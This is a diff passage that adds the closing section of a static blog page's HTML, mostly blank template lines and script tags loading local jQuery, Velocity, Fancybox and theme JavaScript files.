+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
